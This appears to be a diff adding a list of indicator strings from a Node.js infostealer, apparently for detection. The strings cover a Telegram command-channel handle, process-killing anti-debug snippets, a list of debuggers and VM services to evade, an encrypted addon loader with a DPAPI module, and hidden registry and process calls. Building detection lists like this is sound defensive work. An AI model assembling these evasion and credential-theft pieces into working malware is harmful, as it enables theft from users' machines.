@@ -1,0 +1,85 @@
+t.me/constc2
+modules/antidebug/antidebug.js
+powershell Stop-Process -Id
+Get-Process | Where-Object
+Stop-Process -Id $_.Id -Force
+[System.Diagnostics.Debugger]::IsAttached
+KillProcessesByWindowNames
+KillProcessesByNames
+process.abort()
+setInterval(async () =>
+process monitor
+x64dbg
+x32dbg
+ollydbg
+ida -
+ida64
+ghidra
+wireshark
+fiddler
+httpdebugger
+httpdebuggerui
+process hacker
+procmon64
+scyllahide
+dnspy
+de4dot
+megadumper
+ksdumper
+ksdumper v1.1 - by equifox
+simpleassemblyexplorer
+extremedumper
+stringdecryptor
+httpanalyzer
+mitmproxy
+titanhide
+vmtoolsd
+vboxservice
+vboxtray
+vmwaretray
+vmwareservice
+vmwareuser
+qemu-ga
+xenservice
+joeboxcontrol
+joeboxserver
+pestudio
+dumpcap
+taskmgr
+regedit
+addon-loader.js
+node:sea
+getRawAsset
+decryptAddon
+aes-256-cbc
+createDecipheriv
+ADDON_KEY
+addon0.node.enc
+addon1.node.enc
+addon2.node.enc
+dpapi.node.enc
+Addons not ready yet (AntiVM not passed)
+[ADDON-LOADER] VM detected - aborting
+[ADDON-LOADER] AntiVM passed - loading addons...
+global.__antiVMResult
+global.__addonsReady
+Invalid decrypted addon buffer
+Unable to decrypt addon
+Encrypted addon missing
+addon-
+asdtmp
+os.tmpdir()
+createRequire(tempFile)
+winreg
+HKLM
+HKCU
+REG_SZ
+REG_BINARY
+REG_DWORD
+REG QUERY
+REG ADD
+REG DELETE
+system32\\reg.exe
+windowsHide: true
+child_process.exec
+child_process.spawn
